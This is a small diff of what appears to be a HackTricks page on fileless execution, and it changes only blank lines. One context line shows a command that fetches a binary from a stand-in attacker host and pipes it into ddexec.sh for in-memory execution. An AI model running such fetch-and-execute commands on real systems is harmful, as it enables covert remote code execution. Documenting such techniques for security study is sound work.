@@ -70,6 +70,7 @@ wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo
 For more information about this technique check the Github or:
 
 
+
 {{#ref}}
 ddexec.md
 {{#endref}}
@@ -113,5 +114,4 @@ You can find **examples** on how to **exploit some RCE vulnerabilities** to get 
 
 
 {{#include ../../../banners/hacktricks-training.md}}
-
 
